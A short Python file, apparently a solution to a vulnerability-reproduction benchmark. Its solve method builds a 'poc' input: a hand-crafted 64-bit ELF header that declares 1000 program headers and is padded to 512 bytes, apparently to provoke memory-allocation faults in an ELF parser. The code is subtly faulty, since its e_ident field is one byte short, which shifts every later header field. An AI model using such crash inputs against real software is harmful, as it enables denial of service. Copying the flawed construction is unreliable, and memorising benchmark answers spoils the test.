import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00'
        e_type = struct.pack('<H', 3)  # ET_DYN
        e_machine = struct.pack('<H', 0x3e)  # EM_X86_64
        e_version = struct.pack('<I', 1)
        e_entry = struct.pack('<Q', 0)
        e_phoff = struct.pack('<Q', 64)
        e_shoff = struct.pack('<Q', 0)
        e_flags = struct.pack('<I', 0)
        e_ehsize = struct.pack('<H', 64)
        e_phentsize = struct.pack('<H', 56)
        e_phnum = struct.pack('<H', 1000)  # Large to potentially trigger allocation issues
        e_shentsize = struct.pack('<H', 0)
        e_shnum = struct.pack('<H', 0)
        e_shstrndx = struct.pack('<H', 0)
        header = e_ident + e_type + e_machine + e_version + e_entry + e_phoff + e_shoff + e_flags + e_ehsize + e_phentsize + e_phnum + e_shentsize + e_shnum + e_shstrndx
        poc = header + b'\x00' * (512 - len(header))
        return poc
